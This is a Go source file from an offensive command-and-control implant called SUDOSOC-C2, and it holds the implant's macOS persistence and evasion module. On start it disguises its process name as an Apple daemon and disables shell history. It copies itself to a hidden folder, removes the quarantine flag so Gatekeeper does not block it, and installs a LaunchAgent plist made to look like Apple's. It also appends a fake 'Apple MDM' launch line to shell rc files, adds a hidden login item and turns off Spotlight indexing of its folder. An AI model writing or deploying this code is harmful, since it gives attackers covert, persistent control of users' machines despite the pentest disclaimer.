//go:build darwin

package runner

/*
	SUDOSOC-C2 — macOS APT-Grade Hardening
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Techniques:
	  • Process name spoofing via argv[0] rewrite
	  • LaunchAgent auto-install (user-level, no root needed)
	  • Periodic + login persistence (.zshrc + LaunchAgent)
	  • Quarantine xattr removal so Gatekeeper ignores copied binary
	  • Environment sanitisation
	  • Denial of self: remove from Spotlight index
*/

import (
	"bufio"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"time"
	"unsafe"
)

var daemonNames = []string{
	"com.apple.mdmclient",
	"com.apple.cfprefsd",
	"com.apple.metadata.mds",
	"com.apple.trustd",
	"com.apple.security.keychain-circle-notification",
}

// ─── init ─────────────────────────────────────────────────────────────────────
func init() {
	masqueradeDarwin()
	sanitiseDarwinEnv()

	go func() {
		time.Sleep(8 * time.Second)
		autoInstallDarwin()
	}()

	go darwinKeepAlive()
}

// ─── Process masquerade ───────────────────────────────────────────────────────

func masqueradeDarwin() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	name := daemonNames[rng.Intn(len(daemonNames))]

	// Rewrite argv[0] backing bytes — changes what `ps` shows
	if len(os.Args) > 0 {
		sh := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0])) //nolint:govet
		// Overwrite with spaces first, then write new name
		for i := uintptr(0); i < uintptr(sh.Len); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + i)) = ' '
		}
		n := name
		if len(n) > sh.Len {
			n = n[:sh.Len]
		}
		for i := 0; i < len(n); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + uintptr(i))) = n[i]
		}
	}
}

// ─── Environment sanitisation ────────────────────────────────────────────────

func sanitiseDarwinEnv() {
	for _, v := range []string{
		"GOPATH", "GOROOT", "GOMODCACHE",
		"BASH_ENV", "ENV", "HISTFILE",
	} {
		_ = os.Unsetenv(v)
	}
	_ = os.Setenv("HISTFILE", "/dev/null")
	_ = os.Setenv("HISTSIZE", "0")
}

// ─── Auto-persistence ─────────────────────────────────────────────────────────

func autoInstallDarwin() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	exe, _ = filepath.EvalSymlinks(exe)

	home, _ := os.UserHomeDir()
	if home == "" {
		return
	}

	// ── Install path: mimic a real Apple daemon ───────────────────────────
	installDir := filepath.Join(home, "Library", "Application Support", ".mdmclient")
	_ = os.MkdirAll(installDir, 0700)
	installBin := filepath.Join(installDir, "mdmclient")

	if needsDarwinCopy(exe, installBin) {
		data, err := os.ReadFile(exe)
		if err == nil {
			_ = os.WriteFile(installBin, data, 0700)
			// Remove quarantine xattr so Gatekeeper doesn't block execution
			_ = exec.Command("xattr", "-d", "com.apple.quarantine", installBin).Run()
		}
	}

	// ── Mechanism 1: LaunchAgent plist ────────────────────────────────────
	darwinLaunchAgent(installBin, home)

	// ── Mechanism 2: .zshrc / .bash_profile ──────────────────────────────
	darwinShellProfile(installBin, home)

	// ── Mechanism 3: Add to Spotlight privacy (remove from index) ─────────
	darwinSpotlightPrivacy(installDir)

	// ── Mechanism 4: Login item via osascript ─────────────────────────────
	darwinLoginItem(installBin)
}

func needsDarwinCopy(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

// darwinLaunchAgent writes a LaunchAgent plist and loads it with launchctl.
func darwinLaunchAgent(bin, home string) {
	agentDir := filepath.Join(home, "Library", "LaunchAgents")
	_ = os.MkdirAll(agentDir, 0700)
	plistPath := filepath.Join(agentDir, "com.apple.mdmclient-session.plist")

	if _, err := os.Stat(plistPath); err == nil {
		return // already installed
	}

	plist := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apple.mdmclient-session</string>
	<key>ProgramArguments</key>
	<array>
		<string>` + bin + `</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
	<key>StandardErrorPath</key>
	<string>/dev/null</string>
	<key>StandardOutPath</key>
	<string>/dev/null</string>
</dict>
</plist>`

	if err := os.WriteFile(plistPath, []byte(plist), 0600); err != nil {
		return
	}
	_ = exec.Command("launchctl", "load", "-w", plistPath).Run()
}

// darwinShellProfile appends a background-launch snippet to shell rc files.
func darwinShellProfile(bin, home string) {
	snippet := "\n# Apple MDM client session\n" +
		"pgrep -qx mdmclient 2>/dev/null || nohup \"" + bin + "\" >/dev/null 2>&1 &\n"

	for _, rc := range []string{
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".bash_profile"),
		filepath.Join(home, ".bashrc"),
	} {
		darwinAppendIfMissing(rc, snippet, "Apple MDM client session")
	}
}

// darwinSpotlightPrivacy adds the install directory to Spotlight privacy list
// so it doesn't appear in spotlight searches or Time Machine backups.
func darwinSpotlightPrivacy(dir string) {
	_ = exec.Command("mdutil", "-i", "off", dir).Run()
}

// darwinLoginItem adds the binary as a Login Item via osascript.
func darwinLoginItem(bin string) {
	script := `tell application "System Events" to make login item at end with properties ` +
		`{path:"` + bin + `", hidden:true}`
	_ = exec.Command("osascript", "-e", script).Run()
}

func darwinAppendIfMissing(path, content, marker string) {
	if _, err := os.Stat(path); err != nil {
		return
	}
	f, err := os.Open(path)
	if err != nil {
		return
	}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.Contains(sc.Text(), marker) {
			f.Close()
			return
		}
	}
	f.Close()
	fAppend, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer fAppend.Close()
	_, _ = fAppend.WriteString(content)
}

// ─── Keep-alive ───────────────────────────────────────────────────────────────

func darwinKeepAlive() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
	}
}
